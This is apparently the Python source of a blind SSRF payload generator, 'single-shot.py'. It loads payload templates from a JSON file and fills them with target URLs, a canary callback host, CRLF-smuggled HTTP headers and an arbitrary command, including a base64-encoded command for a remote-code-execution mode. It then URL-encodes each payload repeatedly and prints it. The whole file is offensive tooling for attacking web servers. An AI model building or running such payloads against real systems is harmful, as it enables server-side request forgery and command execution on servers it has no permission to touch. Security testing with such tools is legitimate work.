# single-shot.py
"""This module provides the script functionalities"""
import json
import base64
import urllib.parse
import os

class Gun:
    def __init__(self, target, file, command, encode_level, protocol, canary, mode, verbose, _filter):

        self._targets = []

        if target is not None:
            self._targets.append(self.add_protocol(target, protocol))
        else:
            with open(file) as f:
                for line in f:
                    line = line.strip()
                    self._targets.append(self.add_protocol(str(line), "http"))

        if canary is not None:
            self._canary = self.add_protocol(canary, protocol)
        else:
            self._canary = ''

        self._encode_level = int(encode_level)
        self._filter = _filter

        if mode == "canary":
            self._filter.append('http')
            self._filter.append('gopher')
        elif mode == "rce":
            self._filter.append('canaries')

        self._command = str(command)
        self._verbose = verbose
        self._crlf = "{canary}/ HTTP/1.1{newline}Connection:keep-alive{newline}Host:{canary_host}{newline}Content-Length: 1{newline}{newline}1{newline}"

    def reload(self):
        for line in self._targets:
            
            # format CRLF payloads
            self._crlf = self._crlf.format(canary = line, newline = '\\r\\n', canary_host = urllib.parse.urlparse(line).netloc)
            self.trigger(line)
    
    def trigger(self, target):
        payload_file = open('payloads/blind-ssrf-payloads.json') # remember to add dir here
        data = json.load(payload_file)

        for category in data['categories']:
            if category in self._filter:
                continue
            if self._verbose:
                print("[{}]:".format(category))
            for framework in data['categories'][category]:
                if framework in self._filter:
                    continue
                if self._verbose:
                    print("     [{}]:".format(framework))
                for payload in data['categories'][category][framework]:
                    if payload in self._filter:
                        continue
                    address = data['categories'][category][framework][payload]  \
                    .format(target_addr = target, canary_addr = self._canary, 
                    canary_urlencoded =  urllib.parse.quote(self._canary), crlf = self._crlf, newline = '\\r\\n',
                    target_host = urllib.parse.urlparse(target), command = self._command, command_b64encoded = base64.b64encode((self._command).encode('UTF-8')).decode('UTF-8'))

                    for i in range(self._encode_level):
                        address = urllib.parse.quote(address)

                    if self._verbose:    
                        print("             [{}]:\n{}".format(payload, address))
                    else:
                        print("{}".format(address))
    
    def add_protocol(self, target, protocol):
        if target.endswith("/"):
            target = target[:-1]
        if "//" not in target:
            if "//" not in protocol:
                target = protocol + "://" + target
            else:
                target = protocol + target

        return target